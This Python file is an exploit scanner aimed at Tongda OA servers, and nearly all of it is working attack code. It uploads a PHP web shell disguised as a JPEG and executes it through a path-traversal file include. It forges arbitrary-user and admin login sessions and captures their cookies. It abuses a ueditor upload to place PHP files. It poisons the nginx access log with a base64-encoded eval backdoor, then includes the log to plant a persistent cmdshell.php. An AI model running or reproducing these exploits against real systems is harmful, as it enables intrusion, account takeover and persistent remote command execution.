#!/usr/bin/env python
# -*- coding: utf-8 -*-

import json
import os
import re
from random import choice

import requests

import config.config


class tongda:

    def __init__(self):
        pass

    def ALL(self,args):
        self.url=args
        self.results=[]
        self.results.append(self.url)
        self.check()
        self.getV11Session()
        self.get2017Session()
        self.uplaod()
        self.remote_include()

        return self.results

    def check(self):

        try:
            url1 = self.url + '/ispirit/im/upload.php'
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
                "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
            data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['f'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
            result = requests.post(url1, headers=headers, data=data)

            name = "".join(re.findall("2003_(.+?)\|", result.text))
            url2 = self.url + '/ispirit/interface/gateway.php'
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
                "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                "Content-Type": "application/x-www-form-urlencoded"}
            data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "echo fffhhh"}
            result = requests.post(url2, headers=headers, data=data)
            if result.status_code == 200 and 'fffhhh' in result.text:
                self.results.append('通达OA v11.8 gateway.php 远程文件包含漏洞')
        except:
            pass

    def getV11Session(self):

        headers = {}
        checkUrl = self.url + '/general/login_code.php'
        #print(checkUrl)
        try:
            headers[
                "User-Agent"] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"
            getSessUrl = self.url + '/logincheck_code.php'
            res = requests.post(
                getSessUrl, data={'UID': int(1)}, headers=headers)
            self.results.append('通达OA v11 任意用户登录 COOKIE:' + res.headers['Set-Cookie'])
            #print('[+]Get Available COOKIE:' + res.headers['Set-Cookie'])
        except:
            print('[-]Something Wrong With ' + self.url)

    def get2017Session(self):
        headers=[]
        checkUrl = self.url + '/ispirit/login_code.php'
        try:
            headers["User-Agent"] = choice(config.config.user_agents)
            res = requests.get(checkUrl, headers=headers)
            resText = json.loads(res.text)
            codeUid = resText['codeuid']
            codeScanUrl = url + '/general/login_code_scan.php'
            res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
                1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'}, headers=headers)
            resText = json.loads(res.text)
            status = resText['status']
            if status == str(1):
                getCodeUidUrl = url + '/ispirit/login_code_check.php?codeuid=' + codeUid
                res = requests.get(getCodeUidUrl)
                tmp_cookie = res.headers['Set-Cookie']
                headers["User-Agent"] = choice(config.config.user_agents)
                headers["Cookie"] = tmp_cookie
                check_available = requests.get(url + '/general/index.php', headers=headers)
                if '用户未登录' not in check_available.text:
                    if '重新登录' not in check_available.text:
                        self.results.append('通达OA 2017任意用户登录 COOKIE:' + tmp_cookie)

        except:
            pass

    def uplaod(self):

        header = {

            'User-Agent': 'Go-http-client/1.1',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'multipart/form-data; boundary=---------------------------55719851240137822763221368724',
        }

        # 请求体
        data = (
            "-----------------------------55719851240137822763221368724\r\n"
            "Content-Disposition: form-data; name=\"CONFIG[fileFieldName]\"\r\n\r\n"
            "ffff\r\n"
            "-----------------------------55719851240137822763221368724\r\n"
            "Content-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n"
            "1000000000\r\n"
            "-----------------------------55719851240137822763221368724\r\n"
            "Content-Disposition: form-data; name=\"CONFIG[filePathFormat]\"\r\n\r\n"
            "tcmd\r\n"
            "-----------------------------55719851240137822763221368724\r\n"
            "Content-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n"
            ".php\r\n"
            "-----------------------------55719851240137822763221368724\r\n"
            "Content-Disposition: form-data; name=\"ffff\"; filename=\"test.php\"\r\n"
            "Content-Type: application/octet-stream\r\n\r\n"
            "<?php echo md5(1);?>\r\n"
            "-----------------------------55719851240137822763221368724\r\n"
            "Content-Disposition: form-data; name=\"mufile\"\r\n\r\n"
            "submit\r\n"
            "-----------------------------55719851240137822763221368724--\r\n"
        )
        requests.post(url=f'{self.url}/module/ueditor/php/action_upload.php?action=uploadfile',headers=header ,data=data)
        req=requests.get(url=f'{self.url}/tcmd.php')
        if 'c4ca4238a0b' in req.text:
            self.results.append('通达OA v2017 action_upload.php 任意文件上传漏洞')

    def remote_include(self):
        try:
            requests.get(url=self.url+"/d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?>")
            data={
              'json':'{"url": "/general/../../nginx/logs/oa.access.log"}'
            }
            requests.post(url=self.url+"/ispirit/interface/gateway.php",data=data)

            requests.post(url=self.url+"/mac/gateway.php",data=data)
            data1={
                'cmdshell':'echo md5(1);'
            }
            req=requests.post(url=self.url+"/mac/cmdshell.php",data=data1)
            if 'c4ca4238a0b' in req.text:
                self.results.append("通达OA v11.8 getway.php 远程文件包含漏洞")
        except:
            pass




if __name__ == '__main__':
    url='http://192.168.6.210:8888'
    a=tongda()
    # proxy = "http://127.0.0.1:8080"
    # os.environ["http_proxy"] = proxy
    # os.environ["https_proxy"] = proxy
    aa=a.ALL(url)
    print(aa)

